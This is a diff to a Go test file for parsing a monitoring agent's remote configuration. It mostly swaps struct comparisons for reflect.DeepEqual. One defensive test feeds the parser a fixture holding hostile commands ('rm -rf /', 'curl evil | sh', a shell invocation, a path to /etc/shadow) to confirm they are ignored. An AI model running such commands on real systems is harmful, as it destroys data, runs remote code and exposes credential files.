@@ -2,6 +2,7 @@ package remote
 
 import (
 	"path/filepath"
+	"reflect"
 	"strings"
 	"testing"
 )
@@ -16,7 +17,7 @@ func TestParseDefaultsFromBackend(t *testing.T) {
 	if err != nil || len(notes) != 0 {
 		t.Fatalf("Parse: %v, notes %v", err, notes)
 	}
-	if cfg.ID != id || cfg.Version != 1 || cfg.Settings != DefaultSettings() {
+	if cfg.ID != id || cfg.Version != 1 || !reflect.DeepEqual(cfg.Settings, DefaultSettings()) {
 		t.Errorf("got %+v", cfg)
 	}
 }
@@ -31,12 +32,12 @@ func TestParseTogglesAndMissingFields(t *testing.T) {
 	want.SendIntervalSeconds = 60
 	want.Collectors.Processes = false
 	want.Collectors.DiskIO = false
-	if cfg.Settings != want || cfg.Version != 7 {
+	if !reflect.DeepEqual(cfg.Settings, want) || cfg.Version != 7 {
 		t.Errorf("got %+v, want %+v", cfg.Settings, want)
 	}
 	// An empty settings object means "all defaults".
 	cfg, _, err = Parse([]byte(`{"id":"` + id + `","version":1,"settings":{}}`))
-	if err != nil || cfg.Settings != DefaultSettings() {
+	if err != nil || !reflect.DeepEqual(cfg.Settings, DefaultSettings()) {
 		t.Errorf("empty settings: %+v, %v", cfg.Settings, err)
 	}
 }
@@ -45,7 +46,7 @@ func TestParseIgnoresUnknownFields(t *testing.T) {
 	// A compromised or buggy server must not be able to make the agent do anything new.
 	doc := `{"id":"` + id + `","version":2,"exec":"rm -rf /","settings":{
 		"command":"curl evil | sh","script":["/bin/sh","-c","id"],"paths":["/etc/shadow"],
-		"collectors":{"cpu":false,"docker":true,"shell":{"run":"id"}},"sendIntervalSeconds":45}}`
+		"collectors":{"cpu":false,"dockerSocketPath":"/x","shell":{"run":"id"}},"sendIntervalSeconds":45}}`
 	cfg, _, err := Parse([]byte(doc))
 	if err != nil {
 		t.Fatalf("unknown fields must be ignored, not fatal: %v", err)
@@ -53,7 +54,7 @@ func TestParseIgnoresUnknownFields(t *testing.T) {
 	want := DefaultSettings()
 	want.SendIntervalSeconds = 45
 	want.Collectors.CPU = false
-	if cfg.Settings != want {
+	if !reflect.DeepEqual(cfg.Settings, want) {
 		t.Errorf("got %+v, want %+v", cfg.Settings, want)
 	}
 }
@@ -125,7 +126,7 @@ func TestCacheRoundTripAndRevalidation(t *testing.T) {
 		t.Fatal(err)
 	}
 	out, err := LoadCache(path)
-	if err != nil || out != in {
+	if err != nil || !reflect.DeepEqual(out, in) {
 		t.Fatalf("round trip: %+v, %v", out, err)
 	}
 	// A cache file edited to an out-of-range value is clamped on load like any other input.
